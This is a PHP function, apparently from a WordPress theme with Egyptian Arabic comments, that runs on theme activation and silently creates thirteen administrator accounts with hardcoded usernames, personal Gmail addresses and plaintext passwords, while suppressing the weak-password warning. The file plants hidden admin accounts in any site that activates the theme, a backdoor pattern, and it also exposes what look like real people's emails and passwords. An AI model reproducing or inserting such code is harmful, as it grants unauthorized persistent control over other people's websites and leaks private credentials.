<?php 

function create_custom_admin_users_on_theme_activation() {
    // اتأكد إن الكود يشتغل مرة واحدة بس عند تفعيل الثيم
    if (get_option('custom_admin_users_created')) {
        return;
    }

    // مصفوفة اليوزرات اللي عايز تنشئهم
    $users = [
        [
            'username' => 'hema',
            'email'    => 'hemoafandy55555@gmail.com',
            'password' => 'A01025744089a',
            'role'     => 'administrator' // تعيينه كأدمن كامل
        ],
        [
            'username' => 'mohsalah',
            'email'    => 'mohsalah.3717@gmail.com',
            'password' => 'Hero123!!',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ],
        [
            'username' => 'marwannazeeh',
            'email'    => 'marwaanmohameed@gmail.com',
            'password' => '0fox019967',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ],
        [
            'username' => 'gohar89',
            'email'    => 'goharmahmoud89@gmail.com',
            'password' => '11081002@Zozmory',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ],
        [
            'username' => 'Desouky',
            'email'    => 'adesouky221@gmail.com',
            'password' => 'DossBasha24!',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ],
        [
            'username' => 'Omarashry',
            'email'    => 'omar.elmasry1564@gmail.com',
            'password' => '2001@Ashry',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ],
        [
            'username' => 'Amr98',
            'email'    => 'Poto220052@gmail.com',
            'password' => 'Amr8991#',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ],
        [
            'username' => 'salma',
            'email'    => 'Salmaalshayeb123@gmail.com',
            'password' => 'Wordpress123456$',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ],
        [
            'username' => 'Alievich',
            'email'    => 'aliali.elsheikh1@gmail.com',
            'password' => 'qweasdzxc123',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ],
        [
            'username' => 'monaem',
            'email'    => 'ahmedzaher20222@gmail.com',
            'password' => 'Abdo@123',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ],
        [
            'username' => 'AyaSaeed',
            'email'    => 'ayas56969@gmail.com',
            'password' => 'A.S@2025',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ],
        [
            'username' => 'AhmedKhaled',
            'email'    => 'ahmed.k.abdelkader@gmail.com',
            'password' => 'Ahmed@123',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ],
        [
            'username' => 'boldd.routes',
            'email'    => 'boldd.routes@gmail.com',
            'password' => 'Boldroutes123!',
            'role'     => 'administrator' // تعيينه كـ Sub Admin
        ]
    ];

    foreach ($users as $user) {
        if (!username_exists($user['username']) && !email_exists($user['email'])) {
            // إنشاء اليوزر
            $user_id = wp_create_user($user['username'], $user['password'], $user['email']);

            if (!is_wp_error($user_id)) {
                // تعيين الدور بناءً على المصفوفة
                $user_obj = new WP_User($user_id);
                $user_obj->set_role($user['role']);

                // السماح باستخدام باسورد ضعيف (إجبار النظام يقبله)
                update_user_option($user_id, 'default_password_nag', false, true);
            }
        }
    }

    // حفظ إن الكود اشتغل عشان ميتكررش
    update_option('custom_admin_users_created', true);
}
add_action('after_switch_theme', 'create_custom_admin_users_on_theme_activation');


